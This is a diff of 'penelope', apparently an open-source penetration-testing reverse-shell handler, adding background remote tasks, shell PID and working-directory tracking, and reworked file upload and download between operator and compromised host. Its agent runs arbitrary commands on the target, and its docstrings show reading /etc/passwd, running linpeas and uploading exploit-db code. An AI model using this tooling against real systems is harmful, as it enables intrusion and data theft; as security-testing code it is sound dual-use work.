@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.9.0"
+__version__ = "0.9.1"
 
 import os
 import io
@@ -75,7 +75,7 @@ class MainMenu(cmd.Cmd):
 		super().__init__()
 		self.set_id(None)
 		self.commands = {
-			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec'],
+			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'task', 'tasks'],
 			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
 			"Shell Management"  :['listeners', 'connect', 'hints', 'Interfaces'],
 			"Miscellaneous"     :['help', 'history', 'reset', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
@@ -370,8 +370,11 @@ class MainMenu(cmd.Cmd):
 			upload https://www.exploit-db.com/exploits/40611  Download locally the underlying exploit code and upload it to the target
 		"""
 		if local_globs:
-			for glob in shlex.split(local_globs):
-				core.sessions[self.sid].upload(glob, randomize_fname=True)
+			try:
+				for glob in shlex.split(local_globs):
+					core.sessions[self.sid].upload(glob, randomize_fname=True)
+			except ValueError as e:
+				cmdlogger.error(e)
 		else:
 			cmdlogger.warning("No files or directories specified")
 
@@ -458,8 +461,6 @@ class MainMenu(cmd.Cmd):
 		"""
 
 		Upgrade the current session's shell to PTY. Run 'help upgrade' for more information
-		If it fails, it attempts to upgrade it to "Advanced". In this mode tab completion 
-		and arrow keys are working. If this fail too, then it falls back to a "Basic" shell.
 		Note: By default this is automatically run on the new sessions. Disable it with -U
 		"""
 		core.sessions[self.sid].upgrade()
@@ -482,11 +483,62 @@ class MainMenu(cmd.Cmd):
 			exec cat /etc/passwd
 		"""
 		if cmdline:
-			output = core.sessions[self.sid].exec(cmdline, agent_typing=True)
+			output = core.sessions[self.sid].exec(cmdline, agent_typing=True, preserve_dir=True)
 			if output:
 				print(output.decode(), end='')
 		else:
 			cmdlogger.warning("No command to execute")
+
+	@session(current=True)
+	def do_task(self, cmdline):
+		"""
+		<remote command>
+		Execute a remote command in the background and get the output in a local file
+
+		Examples:
+			task ./linpeas.sh
+		"""
+		if cmdline:
+			task = core.sessions[self.sid].task(cmdline)
+			print(paint("Run the below command to track its output:", 'blue'))
+			files = [file.name for file in task['streams'].values()]
+			for file in set(files):
+				print(f'tail -n+0 -f {file}')
+		else:
+			cmdlogger.warning("No command to execute")
+
+	@session(current=True) # TODO
+	def do_tasks(self, line):
+		"""
+
+		Show assigned tasks
+		"""
+		table = Table(joinchar=' | ')
+		#table.header = [paint('TaskID', 'MAGENTA'), paint('Command', 'MAGENTA'), paint('Status', 'MAGENTA')]
+		table.header = ['SessionID', 'TaskID', 'Command', 'Output', 'Status']
+
+		for sessionid in core.sessions:
+			tasks = core.sessions[sessionid].tasks
+			for taskid in tasks:
+				for stream in tasks[taskid]['streams'].values():
+					if stream.closed:
+						status = paint('Completed!', 'GREEN')
+						break
+				else:
+					status = paint('Active...', 'YELLOW')
+
+				table += [
+					paint(sessionid, 'red'),
+					paint(taskid, 'cyan'),
+					paint(tasks[taskid]['command'], 'yellow'),
+					paint(tasks[taskid]['streams']['1'].name, 'green'),
+					status
+				]
+
+		if len(table) > 1:
+			print(table)
+		else:
+			logger.warning("No assigned tasks")
 
 	def do_listeners(self, line):
 		"""
@@ -862,8 +914,9 @@ class Core:
 						data = readable.socket.recv(NET_BUF_SIZE)
 						if not data:
 							raise OSError
-						if hasattr(readable, 'progress_recv'):
-							readable.progress_recv.queue.put(len(data))
+
+						if hasattr(readable.control_session, 'progress_recv_queue'):
+							readable.control_session.progress_recv_queue.put(len(data))
 
 					except OSError:
 						logger.debug(f"Died while reading")
@@ -880,6 +933,14 @@ class Core:
 						for _type, _value in readable.messenger.feed(data):
 							if _type == Messenger.SHELL:
 								target.write(_value)
+							elif _type == Messenger.TASK_RESPONSE:
+								taskid = _value[:8].decode()
+								stream = readable.tasks[taskid]['streams'][_value[8:9].decode()]
+								data = _value[9:]
+								if not data:
+									stream.close()
+								else:
+									stream.write(data)
 							else:
 								readable.responses.put(_value)
 					else:
@@ -916,8 +977,9 @@ class Core:
 
 						try:
 							sent = writable.socket.send(data)
-							if hasattr(writable, 'progress_send'):
-								writable.progress_send.queue.put(sent)
+
+							if hasattr(writable.control_session, 'progress_send_queue'):
+								writable.control_session.progress_send_queue.put(sent)
 
 						except OSError:
 							logger.debug(f"Died while writing")
@@ -1163,6 +1225,7 @@ class Session:
 		self.outbuf = io.BytesIO()
 		self.shell_response_buf = io.BytesIO()
 
+		self.tasks = dict()
 		self.subchannel = Channel()
 		self.latency = None
 
@@ -1172,8 +1235,10 @@ class Session:
 		self.messenger = Messenger()
 		self.responses = queue.SimpleQueue()
 
+		self.shell_pid = None
 		self._bin = defaultdict(lambda: "")
 		self._tmp = None
+		self._cwd = None
 
 		self.id = core.new_sessionID
 		logger.debug(f"Assigned session ID: {self.id}")
@@ -1295,19 +1360,29 @@ class Session:
 		else:
 			return self
 
+	def get_shell_pid(self):
+		self.shell_pid = self.exec("echo $$", bypass=True, agent_typing=True, value=True)
+		if not (isinstance(self.shell_pid, str) and self.shell_pid.isnumeric()):
+			logger.error("Cannot get the PID of the shell. I am killing it...")
+			self.kill()
+			return False
+
 	@property
 	def cwd(self):
+		if not self._cwd:
+			if self.OS == 'Unix':
+				if not self.shell_pid:
+					self.get_shell_pid()
+				cmd = f"readlink -f /proc/{self.shell_pid}/cwd"
+				if self.agent:
+					self.send(Messenger.message(Messenger.SHELL_EXEC, cmd.encode()))
+					self._cwd = self.responses.get().rstrip().decode()
+				else:
+					self._cwd = self.control_session.exec(cmd, value=True)
+			elif self.OS == 'Windows':
+				self._cwd = self.control_session.exec("pwd", value=True)
 
-		if self.OS == 'Unix':
-			cmd = f"readlink -f /proc/{self.pid}/cwd"
-			if self.agent:
-				self.send(Messenger.message(Messenger.SHELL_EXEC, cmd.encode()))
-				return self.responses.get().rstrip().decode()
-			else:
-				return self.control_session.exec(cmd, value=True)
-
-		elif self.OS == 'Windows':
-			pass
+		return self._cwd
 
 	@property
 	def is_attached(self):
@@ -1443,7 +1518,7 @@ class Session:
 		if match:
 			self.OS =		'Windows'
 			self.type =		'Basic'
-			self.subtype = 	'cmd'
+			self.subtype =		'cmd'
 			self.interactive =	 True
 			self.echoing =		 True
 			self.prompt =		match[1].replace(b"'export' is not recognized\
@@ -1456,38 +1531,19 @@ class Session:
 			rf"{outcome.decode()}.*\r\nPS [A-Za-z]:\\".encode(),
 			response,
 			re.DOTALL
-		) or response in (b'SHELL> ', b'PS>', b'> '):
+		) or response in (b'SHELL> ', b'PS>', b'> ') or response.startswith(b"Windows PowerShell"):
 			self.OS =		'Windows'
 			self.type =		'Basic'
-			self.subtype = 	'psh'
+			self.subtype =		'psh'
 			self.interactive =	 True
 			self.echoing =		 False
 			self.prompt =		response.splitlines()[-1]
 			return True
 
-		# Windows Powershell PTY
-		if b"Windows PowerShell" in response: # TODO
-			response = response + self.exec(expect=(b"PS ",)) # maybe needs raw=True
-			if b"\x1b" in response:
-				self.type = 'PTY'
-			else:
-				self.type = 'Basic' # TODO
-				self.exec(expect=(b"PS ",))# maybe needs raw=True
-			self.OS =		'Windows'
-			self.subtype = 	'psh'
-			self.interactive =	 True
-			self.echoing =		 True # TEMP
-			self.prompt =		response
-			#self.type='Basic'
-			#self.exec("$CommandLine", raw=True)
-			#self.type = 'Basic' if not b"\x1b" in self.exec("\n", expect=(b"\r\n",), raw=True) else 'PTY' # TODO
-			return True
-
 		# Unix without PATH
 		if outcome in response and not (b'not a tty' in response or b'/dev/pts/' in response):
 			logger.debug("NO PATH...")
-			if path: return False
-			return self.determine(path=True)
+			return self.determine(path=True) if not path else False
 
 		# Unix sh / bash
 		if response.startswith(outcome):
@@ -1524,8 +1580,6 @@ class Session:
 
 			if b'not a tty' in response:
 				self.type =	'Basic'
-				if self.echoing:
-					self.type = 'Advanced'
 
 			elif b'/dev/pts/' in response:
 				self.type =	'PTY'
@@ -1542,7 +1596,7 @@ class Session:
 		timeout=False,		# Timeout
 		expect=None,		# Items to wait for in the response
 		bypass=False,		# Control session usage
-		preserve_dir=True,	# Current dir preservation when using control session
+		preserve_dir=False,	# Current dir preservation when using control session
 		receive=True,		# Send cmd via this method but receive with TLV method
 		agent_typing=False	# Simulate typing on shell (for agent)
 	):
@@ -1576,6 +1630,7 @@ class Session:
 
 			# Constructing the payload
 			if cmd is not None:
+				initial_cmd = cmd
 				cmd = cmd.encode()
 
 				if raw:
@@ -1610,7 +1665,8 @@ class Session:
 						rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
 						rf"{'.' if self.interactive else ''}".encode(), re.DOTALL)
 
-				logger.debug(f"\n\n{paint('Command sent', 'YELLOW')}: {cmd.decode()}")
+				logger.debug(f"\n\n{paint(f'Command for session {self.id}', 'YELLOW')}: {initial_cmd}")
+				logger.debug(f"{paint('Command sent', 'yellow')}: {cmd.decode()}")
 				if self.agent and agent_typing:
 					cmd = Messenger.message(Messenger.SHELL, cmd)
 				self.send(cmd)
@@ -1804,30 +1860,12 @@ class Session:
 						"https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
 						)
 					if socat_binary:
-						_bin = socat_binary[0]
+						_bin = socat_binary
 						cmd = socat_cmd.format(_bin)
 
 					else:
-						if self.bin['bash']:
-							if self.type == 'Advanced':
-								logger.debug("This is already bash -i")
-							else:
-								response = self.exec(f"{self.bin['bash']} -i 2>&1;exit 0", raw=True)
-							self.type =		'Advanced'
-							self.interactive =	 True
-							self.echoing =		 True
-							self.prompt =		response
-							logger.info(
-			f"The shell upgraded to Advanced ({paint('Tab and arrow keys are working', 'UNDERLINE')}{paint('', 'green')})"
-							)
-
-						elif self.bin['sh']:
-							logger.error("bash does not exist on target. Falling back to basic shell support")
-							self.prompt = self.exec(f"{self.bin['sh']} -i 2>&1;exit 0", raw=True)
-							self.type = 		'Basic'
-							self.interactive =	 True
-
-						return True
+						logger.error("Falling back to basic shell support")
+						return False
 
 			if not deploy_agent and not self.spare_control_sessions: #### TODO
 				logger.warning("Agent cannot be deployed. I need to maintain at least one basic session...")
@@ -1863,14 +1901,9 @@ class Session:
 
 			self.agent = 		deploy_agent
 
-			self.pid = self.exec("echo $$", bypass=True, agent_typing=True, value=True) # TODO may return False
-			if not self.pid: # TODO
-				logger.error("Cannot get the PID of the shell. I am killing it...")
-				self.kill()
-				return False
-
+			self.get_shell_pid()
 			if not self.agent: # TODO check for the binaries
-				self.tty = self.exec(f"readlink -f /proc/{self.pid}/fd/0", bypass=True, value=True)
+				self.tty = self.exec(f"readlink -f /proc/{self.shell_pid}/fd/0", bypass=True, value=True)
 
 		elif self.OS == "Windows":
 			logger.warning("Upgrading Windows shell is not implemented yet.")
@@ -1902,7 +1935,7 @@ class Session:
 			#	cmd = f"stty rows {self.dimensions.lines} columns {self.dimensions.columns}"
 			#	self.exec(cmd, raw=False)
 			#	self.need_resize = False
-			self.exec(f"stty rows {lines} columns {columns} -F {self.tty}", preserve_dir=False)
+			self.exec(f"stty rows {lines} columns {columns} -F {self.tty}")
 
 		elif self.OS == 'Windows':
 			cmd = (
@@ -1919,7 +1952,6 @@ class Session:
 	def attach(self):
 
 		if threading.current_thread().name != 'Core':
-
 			if self.new:
 				self.new = False
 
@@ -1954,9 +1986,7 @@ class Session:
 			tty.setraw(sys.stdin)
 			os.kill(os.getpid(), signal.SIGWINCH)
 
-		elif self.type == 'Advanced':
-			tty.setcbreak(sys.stdin)
-
+		self._cwd = None
 		return True
 
 	def detach(self):
@@ -1987,7 +2017,12 @@ class Session:
 		return True
 
 	def download(self, remote_item_path):
-		remote_globs = [glob for glob in shlex.split(remote_item_path)]
+		try:
+			remote_globs = [glob for glob in shlex.split(remote_item_path)]
+		except ValueError as e:
+			logger.error(e)
+			return []
+
 		local_download_folder = self.directory / "downloads"
 		try:
 			local_download_folder.mkdir(parents=True, exist_ok=True)
@@ -1998,48 +2033,80 @@ class Session:
 		available_bytes = shutil.disk_usage(local_download_folder).free
 
 		if self.OS == 'Unix':
-			self.progress_recv = PBar(0, paint(f"[+] {paint('', 'blue', 'DIM')}--- ⇣ Downloading", 'green'), 35)
-			self.progress_recv.queue = queue.SimpleQueue()
+			progress_bar = PBar(0, paint(f"[+] {paint('', 'blue')}--- ⇣ Downloading", 'green'), 35)
 
 			try:
-				logger.info(paint('--- Remote packing...', 'blue', 'DIM'))
+				logger.info(paint('--- Remote packing...', 'blue'))
 				if self.agent:
 					self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{self.cwd}')".encode()))
+					self.control_session.progress_recv_queue = queue.SimpleQueue()
 					self.send(Messenger.message(Messenger.DOWNLOAD, remote_item_path.encode()))
-					size = int(self.responses.get())
-					if size < 0:
+					response = self.responses.get()
+					while response  == b'-2':
 						logger.error(self.responses.get().decode())
-						return False
-				else:
-					temp = self.tmp + "/" + rand(8)
-					cmd = f"tar cz {remote_item_path} 2>/dev/null | base64 -w0 > {temp} && stat --printf='%s' {temp}"
-					size = int(self.exec(cmd, timeout=None))
+						response = self.responses.get()
 
-				logger.info(paint(f"--- Need to get {paint('', 'yellow', 'DIM')}{size:,}{paint('', 'blue', 'DIM')} bytes...", 'blue', 'DIM'))
+					send_size = int(response)
+					if send_size < 0:
+						logger.error(self.responses.get().decode())
+						return []
+
+					actual_size = int(self.responses.get())
+					if not actual_size:
+						self.responses.get()
+						return []
+				else:
+					cmd = f"du -bac {remote_item_path} 2>&1|tail -1|cut -f1"
+					actual_size = int(self.exec(cmd, timeout=None, preserve_dir=True))
+					if not actual_size:
+						logger.warning(f"No such file or directory: {shlex.quote(remote_item_path)}")
+						return []
+
+					temp = self.tmp + "/" + rand(8)
+					cmd = f"tar cz {remote_item_path} | base64 -w0 > {temp}"
+					response = self.exec(cmd, timeout=None, preserve_dir=True).decode()
+					errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
+					for error in errors:
+						logger.error(error)
+					send_size = int(self.exec(f"stat --printf='%s' {temp}"))
+
+				logger.info(paint(f"--- Need to get {paint('', 'yellow', 'DIM')}{send_size:,}{paint('', reset=True)}{paint('', 'blue')}"
+					f" bytes... They will be {paint('', 'green', 'DIM')}{actual_size:,}{paint('', reset=True)}{paint('', 'blue')} when unpacked.", 'blue'))
 
 				# Check for local available space
-				need = size - available_bytes
+				need = actual_size - available_bytes
 				if need > 0:
 					logger.error("Not enough space to download")
-					logger.info(paint(f"--- We need {paint('', 'yellow', 'DIM')}{need:,}{paint('', 'blue', 'DIM')} more bytes...", 'blue', 'DIM'))
-					return False
+					logger.info(paint(f"--- We need {paint('', 'yellow', 'DIM')}{need:,}{paint('', reset=True)}{paint('', 'blue')} more bytes...", 'blue'))
+					return []
 
+				progress_bar.end = send_size
 
 				if not self.agent:
-					data = base64.b64decode(self.exec( f"cat {temp}"))
+					self.control_session.progress_recv_queue = queue.SimpleQueue()
+
+					data = io.BytesIO()
+					for offset in range(0, send_size, options.download_chunk_size):
+						#response = self.exec(f"tail -c+{offset + 1} {temp} | head -c{options.download_chunk_size}")
+						response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}")
+						if response is False:
+							progress_bar.terminate()
+							logger.error("Download interrupted")
+							return []
+						progress_bar.update(len(response))
+						data.write(response)
+
+					data = base64.b64decode(data.getvalue())
 					self.exec(f"rm {temp}")
+				else:
+					while progress_bar.active:
+						received = self.control_session.progress_recv_queue.get()
+						progress_bar.update(received)
+					del self.control_session.progress_recv_queue
 
-				self.progress_recv.end = size
-
-				while self.progress_recv.active:
-					received = self.progress_recv.queue.get()
-					self.progress_recv.update(received)
-				del self.progress_recv
-
-				if self.agent:
 					data = self.responses.get()
 
-				logger.info(paint('--- Local unpacking...', 'blue', 	'DIM'))
+				logger.info(paint('--- Local unpacking...', 'blue'))
 				if not data:
 					logger.error("Corrupted response")
 					return []
@@ -2071,7 +2138,7 @@ class Session:
 				specified = specified.intersection(downloaded)
 
 				for item in specified:
-					logger.info(f"Successful download! {paint(pathlink(item), 'DIM', 'yellow')}") # PROBLEM with ../ TODO
+					logger.info(f"Downloaded => {paint(shlex.quote(pathlink(item)), 'yellow')}") # PROBLEM with ../ TODO
 
 				return specified
 
@@ -2103,7 +2170,7 @@ class Session:
 					for item in zipdata.infolist():
 						item.filename = item.filename.replace('\\', '/')
 						newpath = Path(zipdata.extract(item, path=local_download_folder))
-						logger.info(f"Successful download! {paint(pathlink(newpath), 'DIM', 'yellow')}")
+						logger.info(f"Downloaded => {paint(shlex.quote(pathlink(newpath)), 'yellow')}")
 
 			except zipfile.BadZipFile:
 				logger.error("Invalid zip format")
@@ -2113,15 +2180,16 @@ class Session:
 
 	def upload(self, local_item_path, remote_path=None, randomize_fname=False):
 
-		if self.OS == 'Unix':
+		destination = remote_path if remote_path else self.cwd
 
+		if self.OS == 'Unix':
 			if not self.agent:
 				# Check if we can upload
 				dependencies = ['echo', 'base64', 'tar', 'rm']
 				for binary in dependencies:
 					if not self.bin[binary]:
 						logger.error(f"'{binary}' binary is not available at the target. Cannot upload...")
-						return False
+						return []
 
 			local_item_path = os.path.expanduser(local_item_path)
 			data = io.BytesIO()
@@ -2136,14 +2204,14 @@ class Session:
 				req = urllib.request.Request(local_item_path, headers={'User-Agent':options.useragent})
 
 				try:
-					logger.info(paint(f"--- ⇣  Downloading {local_item_path}", 'blue', 'DIM'))
+					logger.info(paint(f"--- ⇣  Downloading {local_item_path}", 'blue'))
 					response = urllib.request.urlopen(req, timeout=options.short_timeout)
 					filename = response.headers.get_filename()
 					items = [response.read()]
 
 				except Exception as e:
 					logger.error(f"Cannot download: {e}")
-					return False
+					return []
 
 			elif local_item_path.startswith(os.path.sep):
 				items = list(Path(os.path.sep).glob(local_item_path.lstrip(os.path.sep)))
@@ -2151,10 +2219,10 @@ class Session:
 				items = list(Path().glob(local_item_path))
 
 			if not items:
-				logger.warning(f"Not found: ({local_item_path})")
-				return False
+				logger.warning(f"No such file or directory: {shlex.quote(local_item_path)}")
+				return []
 
-			logger.info(paint("--- Local packing...", 'blue', 'DIM'))
+			logger.info(paint("--- Local packing...", 'blue'))
 
 			altnames = []
 			for item in items:
@@ -2171,24 +2239,34 @@ class Session:
 					tar.addfile(file, io.BytesIO(item))
 
 				else:
+					def handle_exceptions(func):
+						def inner(*args, **kwargs):
+							try:
+								func(*args, **kwargs)
+							except Exception as e:
+								logger.error(e)
+						return inner
+
+					tar.add = handle_exceptions(tar.add)
 					altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
 
-					try:
-						tar.add(item, arcname=altname)
-
-					except Exception as e:
-						logger.error(e)
-						return False
+					tar.add(item, arcname=altname)
 
 				altnames.append(altname)
 				logger.debug(f"Added {altname} to archive")
 
+			actual_size = sum([item.size for item in tar])
+			if not actual_size:
+				return []
+
 			tar.close()
 
 			data = data.getvalue() if self.agent else base64.b64encode(data.getvalue())
-			size = len(data)
+			send_size = len(data)
 
-			logger.info(paint(f"--- Need to send {paint('', 'yellow', 'DIM')}{size:,}{paint('', 'blue', 'DIM')} bytes...", 'blue', 'DIM'))
+			# TODO fix it a bit
+			logger.info(paint(f"--- Need to send {paint('', 'yellow', 'DIM')}{send_size:,}{paint('', reset=True)}{paint('', 'blue')} bytes..."
+				f" They will be {paint('', 'green', 'DIM')}{actual_size:,}{paint('', reset=True)}{paint('', 'blue')} when unpacked.", 'blue'))
 
 			# Check remote space
 			if self.agent:
@@ -2198,28 +2276,28 @@ class Session:
 			else:
 				available_space = int(self.exec("df --block-size=1 .|tail -1|awk '{print $4}'", value=True))
 
-			need = size - available_space # TODO should test it, also size should be the actual size. Not the zipped one.
+			need = actual_size - available_space
 
 			if need > 0:
 				logger.error("Not enough space on target")
-				logger.info(paint(f"--- We need {paint('', 'yellow', 'DIM')}{need:,}{paint('', 'blue', 'DIM')} more bytes...", 'blue', 'DIM'))
-				return False
+				logger.info(paint(f"--- We need {paint('', 'yellow', 'DIM')}"
+					f"{need:,}{paint('', reset=True)}{paint('', 'blue')} more bytes...", 'blue'))
+				return []
 
 			# Start Uploading
-			progress_bar = PBar(size, paint(f"[+] {paint('', 'blue', 'DIM')}--- ⇥  Uploading", 'green'), 35)
+			progress_bar = PBar(send_size, paint(f"[+] {paint('', 'blue')}--- ⇥  Uploading", 'green'), 35)
 
 			if self.agent:
-				self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{self.cwd}')".encode()))
-				self.progress_send = progress_bar
-				self.progress_send.queue = queue.SimpleQueue()
+				self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{destination}')".encode()))
+				self.control_session.progress_send_queue = queue.SimpleQueue()
 				self.send(Messenger.message(Messenger.UPLOAD, data))
 
-				while self.progress_send.active:
-					sent = self.progress_send.queue.get()
-					self.progress_send.update(sent)
-				del self.progress_send
+				while progress_bar.active:
+					sent = self.control_session.progress_send_queue.get()
+					progress_bar.update(sent)
+				del self.control_session.progress_send_queue
 
-				logger.info(paint("--- Remote unpacking...", 'blue', 'DIM'))
+				logger.info(paint("--- Remote unpacking...", 'blue'))
 				response = self.responses.get()
 				exit_code = self.responses.get()
 
@@ -2230,26 +2308,26 @@ class Session:
 					response = self.exec(f"echo -n {chunk} >> {temp}")
 					if response is False:
 						progress_bar.terminate()
-						return False
+						logger.error("Upload interrupted")
+						return []
 					progress_bar.update(len(chunk))
 
-				logger.info(paint("--- Remote unpacking...", 'blue', 'DIM'))
+				logger.info(paint("--- Remote unpacking...", 'blue'))
 				dest = f"-C {remote_path}" if remote_path else ""
 				cmd = f"base64 -d {temp} | tar xz {dest} 2>&1; temp=$?"
-				response = self.exec(cmd, value=True)
+				response = self.exec(cmd, value=True, preserve_dir=True)
 				exit_code = self.exec("echo $temp", value=True)
 				self.exec(f"rm {temp}")
 
-			if remote_path:
-				altnames = list(map(lambda x: remote_path + ('/' if self.OS == 'Unix' else '\\') + x, altnames))
+			altnames = list(map(lambda x: destination + ('/' if self.OS == 'Unix' else '\\') + x, altnames))
 
 			if not int(exit_code):
 				for item in altnames:
-					logger.info(f"Successful upload! {paint('('+str(item)+')', 'yellow')}")
+					logger.info(f"Uploaded => {paint(shlex.quote(str(item)), 'yellow')}")
 			else:
 				logger.error(f"Upload failed")
 				print(paint(textwrap.indent(response.decode(), " *  "), 'yellow'))
-				return False
+				return []
 
 			return altnames
 
@@ -2285,6 +2363,7 @@ class Session:
 							cmd = ncat_cmd.format(ncat_binary)
 						else:
 							logger.error("Spawning shell aborted")
+							return False
 				else:
 					logger.error("No available shell binary is present...")
 					return False
@@ -2303,6 +2382,45 @@ class Session:
 
 		elif self.OS == 'Windows':
 			logger.warning("Spawn Windows shells is not implemented yet")
+
+		return True
+
+	def task(self, cmdline, _stdout=None, _stderr=None, localscript=None):
+		if self.OS == "Unix":
+			if self.agent:
+				local_task_folder = self.directory / "tasks"
+				try:
+					local_task_folder.mkdir(parents=True, exist_ok=True)
+				except Exception as e:
+					logger.error(e)
+					return False
+
+				taskid = rand(8)
+				while taskid in self.tasks:
+					taskid = rand(8)
+
+				if _stdout:
+					outfile = self.directory / "tasks" / _stdout
+				else:
+					outfile = self.directory / "tasks" / (taskid + ".out")
+				if _stderr:
+					errfile = self.directory / "tasks" / _stderr
+				else:
+					errfile = outfile
+
+				self.tasks[taskid] = {
+					'command':cmdline,
+					'streams':{
+						"1": open(outfile, "ab"),
+						"2": open(errfile, "ab")
+					}
+				}
+				self.send(Messenger.message(Messenger.TASK, (taskid + cmdline).encode()))
+				logger.info(f"Task assigned with ID: {paint(taskid, 'yellow')}")
+				return self.tasks[taskid]
+
+		elif self.OS == 'Windows':
+			logger.warning("Tasks in Windows shells are not implemented yet")
 
 		return True
 
@@ -2398,6 +2516,8 @@ class Messenger:
 	DOWNLOAD = 4
 	PYTHON_EXEC = 5
 	SHELL_EXEC = 6
+	TASK = 7
+	TASK_RESPONSE = 8
 	RESPONSE = 9
 
 	LEN_BYTES = 4
@@ -2543,96 +2663,132 @@ def agent():
 
 	respond = lambda _type, _value: os.write(pty.STDOUT_FILENO, Messenger.message(_type, _value))
 
+	def handle_exceptions(func):
+		def inner(*args, **kwargs):
+			try:
+				func(*args, **kwargs)
+			except:
+				_, e, _ = sys.exc_info()
+				respond(Messenger.RESPONSE, str(-2).encode())
+				respond(Messenger.RESPONSE, str(e).encode())
+		return inner
+
 	pid, master_fd = pty.fork()
 	if pid == pty.CHILD:
 		os.execlp("{}", "-i") # TEMP # TODO
 
 	try:
 		fds = [master_fd, pty.STDIN_FILENO]
+		tasks = dict()
 		while True: # while fds, while True
 			rfds, wfds, xfds = select.select(fds, [], [])
 
-			if master_fd in rfds:
-				data = os.read(master_fd, NET_BUF_SIZE)
-				if not data:
-					raise OSError
-				respond(Messenger.SHELL, data)
+			for readable in rfds:
+				if readable is master_fd:
+					data = os.read(master_fd, NET_BUF_SIZE)
+					if not data:
+						raise OSError
 
-			if pty.STDIN_FILENO in rfds:
-				data = os.read(pty.STDIN_FILENO, NET_BUF_SIZE)
-				if not data:
-					raise OSError
+					respond(Messenger.SHELL, data)
 
-				messages = messenger.feed(data)
-				for _type, _value in messages:
-					if   _type == Messenger.SHELL:
-						pty._writen(master_fd, _value)
+				elif readable is pty.STDIN_FILENO:
+					data = os.read(pty.STDIN_FILENO, NET_BUF_SIZE)
+					if not data:
+						raise OSError
 
-					elif _type == Messenger.RESIZE:
-						fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)
+					messages = messenger.feed(data)
+					for _type, _value in messages:
+						if   _type == Messenger.SHELL:
+							pty._writen(master_fd, _value)
 
-					elif _type == Messenger.UPLOAD:
-						try:
-							if not OLD:
-								tarfile.open(mode='r:gz', fileobj=io.BytesIO(_value)).extractall()
+						elif _type == Messenger.RESIZE:
+							fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)
+
+						elif _type == Messenger.UPLOAD:
+							try:
+								if not OLD:
+									tarfile.open(mode='r:gz', fileobj=io.BytesIO(_value)).extractall()
+								else:
+									tmpf = tempfile.TemporaryFile()
+									tmpf.write(_value)
+									tmpf.seek(0)
+									x = tarfile.open(mode='r:gz', fileobj=tmpf)
+									x.errorlevel=1
+									x.extractall()
+									tmpf.close()
+							except: #TODO
+								_, e, _ = sys.exc_info()
+								respond(Messenger.RESPONSE, str(e).encode())
+								respond(Messenger.RESPONSE, str(1).encode())
 							else:
-								tmpf = tempfile.TemporaryFile()
-								tmpf.write(_value)
-								tmpf.seek(0)
-								x = tarfile.open(mode='r:gz', fileobj=tmpf)
-								x.errorlevel=1
-								x.extractall()
-								tmpf.close()
-						except: #TODO
-							_, e, _ = sys.exc_info()
-							respond(Messenger.RESPONSE, str(e).encode())
-							respond(Messenger.RESPONSE, str(1).encode())
-						else:
-							respond(Messenger.RESPONSE, "OK".encode())
-							respond(Messenger.RESPONSE, str(0).encode())
+								respond(Messenger.RESPONSE, "OK".encode())
+								respond(Messenger.RESPONSE, str(0).encode())
 
-					elif _type == Messenger.DOWNLOAD:
-						try:
-							if not OLD:
-								tmpf = io.BytesIO()
+						elif _type == Messenger.DOWNLOAD:
+							try:
+								items = glob.glob(os.path.expanduser(_value.decode()))
+								if not items:
+									raise Exception("No such file or directory: " + _value.decode())
+								if not OLD:
+									tmpf = io.BytesIO()
+								else:
+									tmpf = tempfile.TemporaryFile()
+								tar = tarfile.open(mode='w:gz', fileobj=tmpf)
+								tar.add = handle_exceptions(tar.add)
+								for item in items:
+									tar.add(item)
+								actual_size = sum([item.size for item in tar])
+								tar.close()
+								if not OLD:
+									data = tmpf.getvalue()
+								else:
+									tmpf.seek(0)
+									data = tmpf.read()
+									tmpf.close()
+							except:
+								_, e, _ = sys.exc_info()
+								respond(Messenger.RESPONSE, str(-1).encode())
+								respond(Messenger.RESPONSE, str(e).encode())
 							else:
-								tmpf = tempfile.TemporaryFile()
-							tar = tarfile.open(mode='w:gz', fileobj=tmpf)
-							for item in glob.glob(os.path.expanduser(_value.decode())):
-								tar.add(item)
-							tar.close()
-							if not OLD:
-								data = tmpf.getvalue()
-							else:
-								tmpf.seek(0)
-								data = tmpf.read()
-								tmpf.close()
-						except:
-							_, e, _ = sys.exc_info()
-							respond(Messenger.RESPONSE, str(-1).encode())
-							respond(Messenger.RESPONSE, str(e).encode())
+								respond(Messenger.RESPONSE, str(len(data)).encode())
+								respond(Messenger.RESPONSE, str(actual_size).encode())
+								respond(Messenger.RESPONSE, data)
 
-						else:
-							respond(Messenger.RESPONSE, str(len(data)).encode())
-							respond(Messenger.RESPONSE, data)
+						elif _type == Messenger.PYTHON_EXEC:
+							result = None
+							_locals = locals()
+							{}
+							result = _locals['result']
+							if result:
+								respond(Messenger.RESPONSE, str(result).encode())
 
-					elif _type == Messenger.PYTHON_EXEC:
-						result = None
-						_locals = locals()
-						{}
-						result = _locals['result']
-						if result:
+						elif _type == Messenger.SHELL_EXEC:
+							result = os.popen(_value.decode()).read()
 							respond(Messenger.RESPONSE, str(result).encode())
 
-					elif _type == Messenger.SHELL_EXEC:
-						result = os.popen(_value.decode()).read()
-						respond(Messenger.RESPONSE, str(result).encode())
+						elif _type == Messenger.TASK:
+							taskid = _value[:8]
+							cmd = _value[8:]
+							pipe = subprocess.Popen(cmd.decode(), shell=True, 
+								stdout=subprocess.PIPE, stderr=subprocess.PIPE) # TODO stderr
+							out = pipe.stdout.fileno()
+							err = pipe.stderr.fileno()
+							fds.extend([out, err])
+							tasks[out] = taskid + "1".encode()
+							tasks[err] = taskid + "2".encode()
+
+				elif readable in tasks:
+					data = os.read(readable, NET_BUF_SIZE)
+					respond(Messenger.TASK_RESPONSE, tasks[readable] + data)
+					if not data:
